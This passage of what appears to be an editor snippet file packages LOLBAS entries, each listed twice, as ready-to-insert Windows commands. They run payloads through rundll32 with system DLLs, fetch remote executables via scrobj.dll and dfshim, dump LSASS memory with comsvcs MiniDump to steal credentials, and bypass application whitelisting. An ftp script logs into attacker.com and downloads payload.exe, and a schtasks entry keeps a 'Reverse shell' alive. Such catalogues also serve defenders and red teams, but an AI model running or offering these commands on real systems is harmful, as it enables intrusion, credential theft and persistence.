            "Advpack.dll is Utility for installing software and drivers with rundll32.exe. it can Launch command line by calling the RegisterOCX function., requires  privilege, category: Execute, it can be used for Run an executable payload..",
            "",
            "```sh",
            "rundll32 advpack.dll, RegisterOCX {CMD}${0}",
            "```"
        ],
        "description": "Advpack.dll is Utility for installing software and drivers with rundll32.exe. it can Launch command line by calling the RegisterOCX function., requires  privilege, category: Execute, it can be used for Run an executable payload.."
    },
    "lolbas Advpack.dll Run an executable payload.": {
        "prefix": "lolbas Advpack.dll",
        "body": [
            "Advpack.dll is Utility for installing software and drivers with rundll32.exe. it can Launch command line by calling the RegisterOCX function., requires  privilege, category: Execute, it can be used for Run an executable payload..",
            "",
            "```sh",
            "rundll32 advpack.dll, RegisterOCX {CMD}${0}",
            "```"
        ],
        "description": "Advpack.dll is Utility for installing software and drivers with rundll32.exe. it can Launch command line by calling the RegisterOCX function., requires  privilege, category: Execute, it can be used for Run an executable payload.."
    },
    "Syssetup.dll Run local or remote script(let) code through INF file specification (Note May pop an error window). (lolbas)": {
        "prefix": "Syssetup.dll",
        "body": [
            "Syssetup.dll is Windows NT System Setup. it can Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified)., requires  privilege, category: AWL Bypass, it can be used for Run local or remote script(let) code through INF file specification (Note May pop an error window)..",
            "",
            "```sh",
            "rundll32 syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 {PATH_ABSOLUTE:.inf}${0}",
            "```"
        ],
        "description": "Syssetup.dll is Windows NT System Setup. it can Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified)., requires  privilege, category: AWL Bypass, it can be used for Run local or remote script(let) code through INF file specification (Note May pop an error window).."
    },
    "lolbas Syssetup.dll Run local or remote script(let) code through INF file specification (Note May pop an error window).": {
        "prefix": "lolbas Syssetup.dll",
        "body": [
            "Syssetup.dll is Windows NT System Setup. it can Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified)., requires  privilege, category: AWL Bypass, it can be used for Run local or remote script(let) code through INF file specification (Note May pop an error window)..",
            "",
            "```sh",
            "rundll32 syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 {PATH_ABSOLUTE:.inf}${0}",
            "```"
        ],
        "description": "Syssetup.dll is Windows NT System Setup. it can Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified)., requires  privilege, category: AWL Bypass, it can be used for Run local or remote script(let) code through INF file specification (Note May pop an error window).."
    },
    "Syssetup.dll Load an executable payload. (lolbas)": {
        "prefix": "Syssetup.dll",
        "body": [
            "Syssetup.dll is Windows NT System Setup. it can Launch an executable file via the SetupInfObjectInstallAction function and .inf file section directive., requires  privilege, category: Execute, it can be used for Load an executable payload..",
            "",
            "```sh",
            "rundll32 syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 {PATH_ABSOLUTE:.inf}${0}",
            "```"
        ],
        "description": "Syssetup.dll is Windows NT System Setup. it can Launch an executable file via the SetupInfObjectInstallAction function and .inf file section directive., requires  privilege, category: Execute, it can be used for Load an executable payload.."
    },
    "lolbas Syssetup.dll Load an executable payload.": {
        "prefix": "lolbas Syssetup.dll",
        "body": [
            "Syssetup.dll is Windows NT System Setup. it can Launch an executable file via the SetupInfObjectInstallAction function and .inf file section directive., requires  privilege, category: Execute, it can be used for Load an executable payload..",
            "",
            "```sh",
            "rundll32 syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 {PATH_ABSOLUTE:.inf}${0}",
            "```"
        ],
        "description": "Syssetup.dll is Windows NT System Setup. it can Launch an executable file via the SetupInfObjectInstallAction function and .inf file section directive., requires  privilege, category: Execute, it can be used for Load an executable payload.."
    },
    "Shell32.dll Load a DLL payload. (lolbas)": {
        "prefix": "Shell32.dll",
        "body": [
            "Shell32.dll is Windows Shell Common Dll. it can Launch a DLL payload by calling the Control_RunDLL function., requires  privilege, category: Execute, it can be used for Load a DLL payload..",
            "",
            "```sh",
            "rundll32.exe shell32.dll,Control_RunDLL {PATH_ABSOLUTE:.dll}${0}",
            "```"
        ],
        "description": "Shell32.dll is Windows Shell Common Dll. it can Launch a DLL payload by calling the Control_RunDLL function., requires  privilege, category: Execute, it can be used for Load a DLL payload.."
    },
    "lolbas Shell32.dll Load a DLL payload.": {
        "prefix": "lolbas Shell32.dll",
        "body": [
            "Shell32.dll is Windows Shell Common Dll. it can Launch a DLL payload by calling the Control_RunDLL function., requires  privilege, category: Execute, it can be used for Load a DLL payload..",
            "",
            "```sh",
            "rundll32.exe shell32.dll,Control_RunDLL {PATH_ABSOLUTE:.dll}${0}",
            "```"
        ],
        "description": "Shell32.dll is Windows Shell Common Dll. it can Launch a DLL payload by calling the Control_RunDLL function., requires  privilege, category: Execute, it can be used for Load a DLL payload.."
    },
    "Shell32.dll Run an executable payload. (lolbas)": {
        "prefix": "Shell32.dll",
        "body": [
            "Shell32.dll is Windows Shell Common Dll. it can Launch command line by calling the ShellExec_RunDLL function., requires  privilege, category: Execute, it can be used for Run an executable payload..",
            "",
            "```sh",
            "rundll32 SHELL32.DLL,ShellExec_RunDLL {PATH:.exe} {CMD:args}${0}",
            "```"
        ],
        "description": "Shell32.dll is Windows Shell Common Dll. it can Launch command line by calling the ShellExec_RunDLL function., requires  privilege, category: Execute, it can be used for Run an executable payload.."
    },
    "lolbas Shell32.dll Run an executable payload.": {
        "prefix": "lolbas Shell32.dll",
        "body": [
            "Shell32.dll is Windows Shell Common Dll. it can Launch command line by calling the ShellExec_RunDLL function., requires  privilege, category: Execute, it can be used for Run an executable payload..",
            "",
            "```sh",
            "rundll32 SHELL32.DLL,ShellExec_RunDLL {PATH:.exe} {CMD:args}${0}",
            "```"
        ],
        "description": "Shell32.dll is Windows Shell Common Dll. it can Launch command line by calling the ShellExec_RunDLL function., requires  privilege, category: Execute, it can be used for Run an executable payload.."
    },
    "Shell32.dll Load a DLL/CPL payload. (lolbas)": {
        "prefix": "Shell32.dll",
        "body": [
            "Shell32.dll is Windows Shell Common Dll. it can Load a DLL/CPL by calling undocumented Control_RunDLLNoFallback function., requires  privilege, category: Execute, it can be used for Load a DLL/CPL payload..",
            "",
            "```sh",
            "rundll32.exe shell32.dll,#44 {PATH:.dll}${0}",
            "```"
        ],
        "description": "Shell32.dll is Windows Shell Common Dll. it can Load a DLL/CPL by calling undocumented Control_RunDLLNoFallback function., requires  privilege, category: Execute, it can be used for Load a DLL/CPL payload.."
    },
    "lolbas Shell32.dll Load a DLL/CPL payload.": {
        "prefix": "lolbas Shell32.dll",
        "body": [
            "Shell32.dll is Windows Shell Common Dll. it can Load a DLL/CPL by calling undocumented Control_RunDLLNoFallback function., requires  privilege, category: Execute, it can be used for Load a DLL/CPL payload..",
            "",
            "```sh",
            "rundll32.exe shell32.dll,#44 {PATH:.dll}${0}",
            "```"
        ],
        "description": "Shell32.dll is Windows Shell Common Dll. it can Load a DLL/CPL by calling undocumented Control_RunDLLNoFallback function., requires  privilege, category: Execute, it can be used for Load a DLL/CPL payload.."
    },
    "Setupapi.dll Run local or remote script(let) code through INF file specification. (lolbas)": {
        "prefix": "Setupapi.dll",
        "body": [
            "Setupapi.dll is Windows Setup Application Programming Interface. it can Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified)., requires  privilege, category: AWL Bypass, it can be used for Run local or remote script(let) code through INF file specification..",
            "",
            "```sh",
            "rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 {PATH_ABSOLUTE:.inf}${0}",
            "```"
        ],
        "description": "Setupapi.dll is Windows Setup Application Programming Interface. it can Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified)., requires  privilege, category: AWL Bypass, it can be used for Run local or remote script(let) code through INF file specification.."
    },
    "lolbas Setupapi.dll Run local or remote script(let) code through INF file specification.": {
        "prefix": "lolbas Setupapi.dll",
        "body": [
            "Setupapi.dll is Windows Setup Application Programming Interface. it can Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified)., requires  privilege, category: AWL Bypass, it can be used for Run local or remote script(let) code through INF file specification..",
            "",
            "```sh",
            "rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 {PATH_ABSOLUTE:.inf}${0}",
            "```"
        ],
        "description": "Setupapi.dll is Windows Setup Application Programming Interface. it can Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified)., requires  privilege, category: AWL Bypass, it can be used for Run local or remote script(let) code through INF file specification.."
    },
    "Setupapi.dll Load an executable payload. (lolbas)": {
        "prefix": "Setupapi.dll",
        "body": [
            "Setupapi.dll is Windows Setup Application Programming Interface. it can Launch an executable file via the InstallHinfSection function and .inf file section directive., requires  privilege, category: Execute, it can be used for Load an executable payload..",
            "",
            "```sh",
            "rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 {PATH_ABSOLUTE:.inf}${0}",
            "```"
        ],
        "description": "Setupapi.dll is Windows Setup Application Programming Interface. it can Launch an executable file via the InstallHinfSection function and .inf file section directive., requires  privilege, category: Execute, it can be used for Load an executable payload.."
    },
    "lolbas Setupapi.dll Load an executable payload.": {
        "prefix": "lolbas Setupapi.dll",
        "body": [
            "Setupapi.dll is Windows Setup Application Programming Interface. it can Launch an executable file via the InstallHinfSection function and .inf file section directive., requires  privilege, category: Execute, it can be used for Load an executable payload..",
            "",
            "```sh",
            "rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 {PATH_ABSOLUTE:.inf}${0}",
            "```"
        ],
        "description": "Setupapi.dll is Windows Setup Application Programming Interface. it can Launch an executable file via the InstallHinfSection function and .inf file section directive., requires  privilege, category: Execute, it can be used for Load an executable payload.."
    },
    "Shdocvw.dll Load an executable payload by calling a .url file with or without quotes. The .url file extension can be renamed. (lolbas)": {
        "prefix": "Shdocvw.dll",
        "body": [
            "Shdocvw.dll is Shell Doc Object and Control Library.. it can Launch an executable payload via proxy through a URL (information) file by calling OpenURL., requires  privilege, category: Execute, it can be used for Load an executable payload by calling a .url file with or without quotes. The .url file extension can be renamed..",
            "",
            "```sh",
            "rundll32.exe shdocvw.dll,OpenURL {PATH_ABSOLUTE:.url}${0}",
            "```"
        ],
        "description": "Shdocvw.dll is Shell Doc Object and Control Library.. it can Launch an executable payload via proxy through a URL (information) file by calling OpenURL., requires  privilege, category: Execute, it can be used for Load an executable payload by calling a .url file with or without quotes. The .url file extension can be renamed.."
    },
    "lolbas Shdocvw.dll Load an executable payload by calling a .url file with or without quotes. The .url file extension can be renamed.": {
        "prefix": "lolbas Shdocvw.dll",
        "body": [
            "Shdocvw.dll is Shell Doc Object and Control Library.. it can Launch an executable payload via proxy through a URL (information) file by calling OpenURL., requires  privilege, category: Execute, it can be used for Load an executable payload by calling a .url file with or without quotes. The .url file extension can be renamed..",
            "",
            "```sh",
            "rundll32.exe shdocvw.dll,OpenURL {PATH_ABSOLUTE:.url}${0}",
            "```"
        ],
        "description": "Shdocvw.dll is Shell Doc Object and Control Library.. it can Launch an executable payload via proxy through a URL (information) file by calling OpenURL., requires  privilege, category: Execute, it can be used for Load an executable payload by calling a .url file with or without quotes. The .url file extension can be renamed.."
    },
    "Scrobj.dll Download file from remote location. (lolbas)": {
        "prefix": "Scrobj.dll",
        "body": [
            "Scrobj.dll is Windows Script Component Runtime. it can Once executed, scrobj.dll attempts to load a file from the URL and saves it to INetCache., requires  privilege, category: Download, it can be used for Download file from remote location..",
            "",
            "```sh",
            "rundll32.exe C:\\Windows\\System32\\scrobj.dll,GenerateTypeLib {REMOTEURL:.exe}${0}",
            "```"
        ],
        "description": "Scrobj.dll is Windows Script Component Runtime. it can Once executed, scrobj.dll attempts to load a file from the URL and saves it to INetCache., requires  privilege, category: Download, it can be used for Download file from remote location.."
    },
    "lolbas Scrobj.dll Download file from remote location.": {
        "prefix": "lolbas Scrobj.dll",
        "body": [
            "Scrobj.dll is Windows Script Component Runtime. it can Once executed, scrobj.dll attempts to load a file from the URL and saves it to INetCache., requires  privilege, category: Download, it can be used for Download file from remote location..",
            "",
            "```sh",
            "rundll32.exe C:\\Windows\\System32\\scrobj.dll,GenerateTypeLib {REMOTEURL:.exe}${0}",
            "```"
        ],
        "description": "Scrobj.dll is Windows Script Component Runtime. it can Once executed, scrobj.dll attempts to load a file from the URL and saves it to INetCache., requires  privilege, category: Download, it can be used for Download file from remote location.."
    },
    "Desk.cpl Launch any executable payload, as long as it uses the .scr extension. (lolbas)": {
        "prefix": "Desk.cpl",
        "body": [
            "Desk.cpl is Desktop Settings Control Panel. it can Launch a remote executable with a .scr extension, located on an SMB share, by calling the InstallScreenSaver function., requires  privilege, category: Execute, it can be used for Launch any executable payload, as long as it uses the .scr extension..",
            "",
            "```sh",
            "rundll32.exe desk.cpl,InstallScreenSaver {PATH_SMB:.scr}${0}",
            "```"
        ],
        "description": "Desk.cpl is Desktop Settings Control Panel. it can Launch a remote executable with a .scr extension, located on an SMB share, by calling the InstallScreenSaver function., requires  privilege, category: Execute, it can be used for Launch any executable payload, as long as it uses the .scr extension.."
    },
    "lolbas Desk.cpl Launch any executable payload, as long as it uses the .scr extension.": {
        "prefix": "lolbas Desk.cpl",
        "body": [
            "Desk.cpl is Desktop Settings Control Panel. it can Launch a remote executable with a .scr extension, located on an SMB share, by calling the InstallScreenSaver function., requires  privilege, category: Execute, it can be used for Launch any executable payload, as long as it uses the .scr extension..",
            "",
            "```sh",
            "rundll32.exe desk.cpl,InstallScreenSaver {PATH_SMB:.scr}${0}",
            "```"
        ],
        "description": "Desk.cpl is Desktop Settings Control Panel. it can Launch a remote executable with a .scr extension, located on an SMB share, by calling the InstallScreenSaver function., requires  privilege, category: Execute, it can be used for Launch any executable payload, as long as it uses the .scr extension.."
    },
    "Mshtml.dll Launch an HTA application. (lolbas)": {
        "prefix": "Mshtml.dll",
        "body": [
            "Mshtml.dll is Microsoft HTML Viewer. it can Invoke an HTML Application via mshta.exe (note: pops a security warning and a print dialogue box)., requires  privilege, category: Execute, it can be used for Launch an HTA application..",
            "",
            "```sh",
            "rundll32.exe Mshtml.dll,PrintHTML {PATH_ABSOLUTE:.hta}${0}",
            "```"
        ],
        "description": "Mshtml.dll is Microsoft HTML Viewer. it can Invoke an HTML Application via mshta.exe (note: pops a security warning and a print dialogue box)., requires  privilege, category: Execute, it can be used for Launch an HTA application.."
    },
    "lolbas Mshtml.dll Launch an HTA application.": {
        "prefix": "lolbas Mshtml.dll",
        "body": [
            "Mshtml.dll is Microsoft HTML Viewer. it can Invoke an HTML Application via mshta.exe (note: pops a security warning and a print dialogue box)., requires  privilege, category: Execute, it can be used for Launch an HTA application..",
            "",
            "```sh",
            "rundll32.exe Mshtml.dll,PrintHTML {PATH_ABSOLUTE:.hta}${0}",
            "```"
        ],
        "description": "Mshtml.dll is Microsoft HTML Viewer. it can Invoke an HTML Application via mshta.exe (note: pops a security warning and a print dialogue box)., requires  privilege, category: Execute, it can be used for Launch an HTA application.."
    },
    "Comsvcs.dll Dump Lsass.exe process memory to retrieve credentials. (lolbas)": {
        "prefix": "Comsvcs.dll",
        "body": [
            "Comsvcs.dll is COM+ Services. it can Calls the MiniDump exported function of comsvcs.dll, which in turns calls MiniDumpWriteDump., requires  privilege, category: Dump, it can be used for Dump Lsass.exe process memory to retrieve credentials..",
            "",
            "```sh",
            "rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump {LSASS_PID} dump.bin full${0}",
            "```"
        ],
        "description": "Comsvcs.dll is COM+ Services. it can Calls the MiniDump exported function of comsvcs.dll, which in turns calls MiniDumpWriteDump., requires  privilege, category: Dump, it can be used for Dump Lsass.exe process memory to retrieve credentials.."
    },
    "lolbas Comsvcs.dll Dump Lsass.exe process memory to retrieve credentials.": {
        "prefix": "lolbas Comsvcs.dll",
        "body": [
            "Comsvcs.dll is COM+ Services. it can Calls the MiniDump exported function of comsvcs.dll, which in turns calls MiniDumpWriteDump., requires  privilege, category: Dump, it can be used for Dump Lsass.exe process memory to retrieve credentials..",
            "",
            "```sh",
            "rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump {LSASS_PID} dump.bin full${0}",
            "```"
        ],
        "description": "Comsvcs.dll is COM+ Services. it can Calls the MiniDump exported function of comsvcs.dll, which in turns calls MiniDumpWriteDump., requires  privilege, category: Dump, it can be used for Dump Lsass.exe process memory to retrieve credentials.."
    },
    "Regsvcs.exe Execute dll file and bypass Application whitelisting (lolbas)": {
        "prefix": "Regsvcs.exe",
        "body": [
            "Regsvcs.exe is Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies. it can Loads the target .NET DLL file and executes the RegisterClass function., requires  privilege, category: AWL Bypass, it can be used for Execute dll file and bypass Application whitelisting.",
            "",
            "```sh",
            "regsvcs.exe {PATH:.dll}${0}",
            "```"
        ],
        "description": "Regsvcs.exe is Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies. it can Loads the target .NET DLL file and executes the RegisterClass function., requires  privilege, category: AWL Bypass, it can be used for Execute dll file and bypass Application whitelisting."
    },
    "lolbas Regsvcs.exe Execute dll file and bypass Application whitelisting": {
        "prefix": "lolbas Regsvcs.exe",
        "body": [
            "Regsvcs.exe is Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies. it can Loads the target .NET DLL file and executes the RegisterClass function., requires  privilege, category: AWL Bypass, it can be used for Execute dll file and bypass Application whitelisting.",
            "",
            "```sh",
            "regsvcs.exe {PATH:.dll}${0}",
            "```"
        ],
        "description": "Regsvcs.exe is Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies. it can Loads the target .NET DLL file and executes the RegisterClass function., requires  privilege, category: AWL Bypass, it can be used for Execute dll file and bypass Application whitelisting."
    },
    "OneDriveStandaloneUpdater.exe Download a file from the Internet without executing any anomalous executables with suspicious arguments (lolbas)": {
        "prefix": "OneDriveStandaloneUpdater.exe",
        "body": [
            "OneDriveStandaloneUpdater.exe is OneDrive Standalone Updater. it can Download a file from the web address specified in HKCU\\Software\\Microsoft\\OneDrive\\UpdateOfficeConfig\\UpdateRingSettingURLFromOC. ODSUUpdateXMLUrlFromOC and UpdateXMLUrlFromOC must be equal to non-empty string values in that same registry key. UpdateOfficeConfigTimestamp is a UNIX epoch time which must be set to a large QWORD such as 99999999999 (in decimal) to indicate the URL cache is good. The downloaded file will be in %localappdata%\\OneDrive\\StandaloneUpdater\\PreSignInSettingsConfig.json, requires  privilege, category: Download, it can be used for Download a file from the Internet without executing any anomalous executables with suspicious arguments.",
            "",
            "```sh",
            "OneDriveStandaloneUpdater${0}",
            "```"
        ],
        "description": "OneDriveStandaloneUpdater.exe is OneDrive Standalone Updater. it can Download a file from the web address specified in HKCU\\Software\\Microsoft\\OneDrive\\UpdateOfficeConfig\\UpdateRingSettingURLFromOC. ODSUUpdateXMLUrlFromOC and UpdateXMLUrlFromOC must be equal to non-empty string values in that same registry key. UpdateOfficeConfigTimestamp is a UNIX epoch time which must be set to a large QWORD such as 99999999999 (in decimal) to indicate the URL cache is good. The downloaded file will be in %localappdata%\\OneDrive\\StandaloneUpdater\\PreSignInSettingsConfig.json, requires  privilege, category: Download, it can be used for Download a file from the Internet without executing any anomalous executables with suspicious arguments."
    },
    "lolbas OneDriveStandaloneUpdater.exe Download a file from the Internet without executing any anomalous executables with suspicious arguments": {
        "prefix": "lolbas OneDriveStandaloneUpdater.exe",
        "body": [
            "OneDriveStandaloneUpdater.exe is OneDrive Standalone Updater. it can Download a file from the web address specified in HKCU\\Software\\Microsoft\\OneDrive\\UpdateOfficeConfig\\UpdateRingSettingURLFromOC. ODSUUpdateXMLUrlFromOC and UpdateXMLUrlFromOC must be equal to non-empty string values in that same registry key. UpdateOfficeConfigTimestamp is a UNIX epoch time which must be set to a large QWORD such as 99999999999 (in decimal) to indicate the URL cache is good. The downloaded file will be in %localappdata%\\OneDrive\\StandaloneUpdater\\PreSignInSettingsConfig.json, requires  privilege, category: Download, it can be used for Download a file from the Internet without executing any anomalous executables with suspicious arguments.",
            "",
            "```sh",
            "OneDriveStandaloneUpdater${0}",
            "```"
        ],
        "description": "OneDriveStandaloneUpdater.exe is OneDrive Standalone Updater. it can Download a file from the web address specified in HKCU\\Software\\Microsoft\\OneDrive\\UpdateOfficeConfig\\UpdateRingSettingURLFromOC. ODSUUpdateXMLUrlFromOC and UpdateXMLUrlFromOC must be equal to non-empty string values in that same registry key. UpdateOfficeConfigTimestamp is a UNIX epoch time which must be set to a large QWORD such as 99999999999 (in decimal) to indicate the URL cache is good. The downloaded file will be in %localappdata%\\OneDrive\\StandaloneUpdater\\PreSignInSettingsConfig.json, requires  privilege, category: Download, it can be used for Download a file from the Internet without executing any anomalous executables with suspicious arguments."
    },
    "Ftp.exe Spawn new process using ftp.exe. Ftp.exe runs cmd /C YourCommand (lolbas)": {
        "prefix": "Ftp.exe",
        "body": [
            "Ftp.exe is A binary designed for connecting to FTP servers. it can Executes the commands you put inside the text file., requires  privilege, category: Execute, it can be used for Spawn new process using ftp.exe. Ftp.exe runs cmd /C YourCommand.",
            "",
            "```sh",
            "echo !{CMD} > ftpcommands.txt && ftp -s:ftpcommands.txt${0}",
            "```"
        ],
        "description": "Ftp.exe is A binary designed for connecting to FTP servers. it can Executes the commands you put inside the text file., requires  privilege, category: Execute, it can be used for Spawn new process using ftp.exe. Ftp.exe runs cmd /C YourCommand."
    },
    "lolbas Ftp.exe Spawn new process using ftp.exe. Ftp.exe runs cmd /C YourCommand": {
        "prefix": "lolbas Ftp.exe",
        "body": [
            "Ftp.exe is A binary designed for connecting to FTP servers. it can Executes the commands you put inside the text file., requires  privilege, category: Execute, it can be used for Spawn new process using ftp.exe. Ftp.exe runs cmd /C YourCommand.",
            "",
            "```sh",
            "echo !{CMD} > ftpcommands.txt && ftp -s:ftpcommands.txt${0}",
            "```"
        ],
        "description": "Ftp.exe is A binary designed for connecting to FTP servers. it can Executes the commands you put inside the text file., requires  privilege, category: Execute, it can be used for Spawn new process using ftp.exe. Ftp.exe runs cmd /C YourCommand."
    },
    "Ftp.exe Spawn new process using ftp.exe. Ftp.exe downloads the binary. (lolbas)": {
        "prefix": "Ftp.exe",
        "body": [
            "Ftp.exe is A binary designed for connecting to FTP servers. it can Download, requires  privilege, category: Download, it can be used for Spawn new process using ftp.exe. Ftp.exe downloads the binary..",
            "",
            "```sh",
            "cmd.exe /c \"@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v\"${0}",
            "```"
        ],
        "description": "Ftp.exe is A binary designed for connecting to FTP servers. it can Download, requires  privilege, category: Download, it can be used for Spawn new process using ftp.exe. Ftp.exe downloads the binary.."
    },
    "lolbas Ftp.exe Spawn new process using ftp.exe. Ftp.exe downloads the binary.": {
        "prefix": "lolbas Ftp.exe",
        "body": [
            "Ftp.exe is A binary designed for connecting to FTP servers. it can Download, requires  privilege, category: Download, it can be used for Spawn new process using ftp.exe. Ftp.exe downloads the binary..",
            "",
            "```sh",
            "cmd.exe /c \"@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v\"${0}",
            "```"
        ],
        "description": "Ftp.exe is A binary designed for connecting to FTP servers. it can Download, requires  privilege, category: Download, it can be used for Spawn new process using ftp.exe. Ftp.exe downloads the binary.."
    },
    "wt.exe Use wt.exe as a proxy binary to evade defensive counter-measures (lolbas)": {
        "prefix": "wt.exe",
        "body": [
            "wt.exe is Windows Terminal. it can Execute a command via Windows Terminal., requires  privilege, category: Execute, it can be used for Use wt.exe as a proxy binary to evade defensive counter-measures.",
            "",
            "```sh",
            "wt.exe {CMD}${0}",
            "```"
        ],
        "description": "wt.exe is Windows Terminal. it can Execute a command via Windows Terminal., requires  privilege, category: Execute, it can be used for Use wt.exe as a proxy binary to evade defensive counter-measures."
    },
    "lolbas wt.exe Use wt.exe as a proxy binary to evade defensive counter-measures": {
        "prefix": "lolbas wt.exe",
        "body": [
            "wt.exe is Windows Terminal. it can Execute a command via Windows Terminal., requires  privilege, category: Execute, it can be used for Use wt.exe as a proxy binary to evade defensive counter-measures.",
            "",
            "```sh",
            "wt.exe {CMD}${0}",
            "```"
        ],
        "description": "wt.exe is Windows Terminal. it can Execute a command via Windows Terminal., requires  privilege, category: Execute, it can be used for Use wt.exe as a proxy binary to evade defensive counter-measures."
    },
    "Dfsvc.exe Use binary to bypass Application whitelisting (lolbas)": {
        "prefix": "Dfsvc.exe",
        "body": [
            "Dfsvc.exe is ClickOnce engine in Windows used by .NET. it can Executes click-once-application from Url (trampoline for Dfsvc.exe, DotNet ClickOnce host), requires  privilege, category: AWL Bypass, it can be used for Use binary to bypass Application whitelisting.",
            "",
            "```sh",
            "rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}${0}",
            "```"
        ],
        "description": "Dfsvc.exe is ClickOnce engine in Windows used by .NET. it can Executes click-once-application from Url (trampoline for Dfsvc.exe, DotNet ClickOnce host), requires  privilege, category: AWL Bypass, it can be used for Use binary to bypass Application whitelisting."
    },
    "lolbas Dfsvc.exe Use binary to bypass Application whitelisting": {
        "prefix": "lolbas Dfsvc.exe",
        "body": [
            "Dfsvc.exe is ClickOnce engine in Windows used by .NET. it can Executes click-once-application from Url (trampoline for Dfsvc.exe, DotNet ClickOnce host), requires  privilege, category: AWL Bypass, it can be used for Use binary to bypass Application whitelisting.",
            "",
            "```sh",
            "rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}${0}",
            "```"
        ],
        "description": "Dfsvc.exe is ClickOnce engine in Windows used by .NET. it can Executes click-once-application from Url (trampoline for Dfsvc.exe, DotNet ClickOnce host), requires  privilege, category: AWL Bypass, it can be used for Use binary to bypass Application whitelisting."
    },
    "OfflineScannerShell.exe Can be used to evade defensive countermeasures or to hide as a persistence mechanism (lolbas)": {
        "prefix": "OfflineScannerShell.exe",
        "body": [
            "OfflineScannerShell.exe is Windows Defender Offline Shell. it can Execute mpclient.dll library in the current working directory, requires  privilege, category: Execute, it can be used for Can be used to evade defensive countermeasures or to hide as a persistence mechanism.",
            "",
            "```sh",
            "OfflineScannerShell${0}",
            "```"
        ],
        "description": "OfflineScannerShell.exe is Windows Defender Offline Shell. it can Execute mpclient.dll library in the current working directory, requires  privilege, category: Execute, it can be used for Can be used to evade defensive countermeasures or to hide as a persistence mechanism."
    },
    "lolbas OfflineScannerShell.exe Can be used to evade defensive countermeasures or to hide as a persistence mechanism": {
        "prefix": "lolbas OfflineScannerShell.exe",
        "body": [
            "OfflineScannerShell.exe is Windows Defender Offline Shell. it can Execute mpclient.dll library in the current working directory, requires  privilege, category: Execute, it can be used for Can be used to evade defensive countermeasures or to hide as a persistence mechanism.",
            "",
            "```sh",
            "OfflineScannerShell${0}",
            "```"
        ],
        "description": "OfflineScannerShell.exe is Windows Defender Offline Shell. it can Execute mpclient.dll library in the current working directory, requires  privilege, category: Execute, it can be used for Can be used to evade defensive countermeasures or to hide as a persistence mechanism."
    },
    "Rasautou.exe Execute DLL code (lolbas)": {
        "prefix": "Rasautou.exe",
        "body": [
            "Rasautou.exe is Windows Remote Access Dialer. it can Loads the target .DLL specified in -d and executes the export specified in -p. Options removed in Windows 10., requires  privilege, category: Execute, it can be used for Execute DLL code.",
            "",
            "```sh",
            "rasautou -d {PATH:.dll} -p export_name -a a -e e${0}",
            "```"
        ],
        "description": "Rasautou.exe is Windows Remote Access Dialer. it can Loads the target .DLL specified in -d and executes the export specified in -p. Options removed in Windows 10., requires  privilege, category: Execute, it can be used for Execute DLL code."
    },
    "lolbas Rasautou.exe Execute DLL code": {
        "prefix": "lolbas Rasautou.exe",
        "body": [
            "Rasautou.exe is Windows Remote Access Dialer. it can Loads the target .DLL specified in -d and executes the export specified in -p. Options removed in Windows 10., requires  privilege, category: Execute, it can be used for Execute DLL code.",
            "",
            "```sh",
            "rasautou -d {PATH:.dll} -p export_name -a a -e e${0}",
            "```"
        ],
        "description": "Rasautou.exe is Windows Remote Access Dialer. it can Loads the target .DLL specified in -d and executes the export specified in -p. Options removed in Windows 10., requires  privilege, category: Execute, it can be used for Execute DLL code."
    },
    "Schtasks.exe Create a recurring task to keep reverse shell session(s) alive (lolbas)": {
        "prefix": "Schtasks.exe",
        "body": [
            "Schtasks.exe is Schedule periodic tasks. it can Create a recurring task to execute every minute., requires  privilege, category: Execute, it can be used for Create a recurring task to keep reverse shell session(s) alive.",
            "",
            "```sh",
            "schtasks /create /sc minute /mo 1 /tn \"Reverse shell\" /tr \"{CMD}\"${0}",
            "```"
        ],
        "description": "Schtasks.exe is Schedule periodic tasks. it can Create a recurring task to execute every minute., requires  privilege, category: Execute, it can be used for Create a recurring task to keep reverse shell session(s) alive."
    },
    "lolbas Schtasks.exe Create a recurring task to keep reverse shell session(s) alive": {
        "prefix": "lolbas Schtasks.exe",
        "body": [
            "Schtasks.exe is Schedule periodic tasks. it can Create a recurring task to execute every minute., requires  privilege, category: Execute, it can be used for Create a recurring task to keep reverse shell session(s) alive.",
            "",
            "```sh",
            "schtasks /create /sc minute /mo 1 /tn \"Reverse shell\" /tr \"{CMD}\"${0}",
            "```"
        ],
        "description": "Schtasks.exe is Schedule periodic tasks. it can Create a recurring task to execute every minute., requires  privilege, category: Execute, it can be used for Create a recurring task to keep reverse shell session(s) alive."
    },
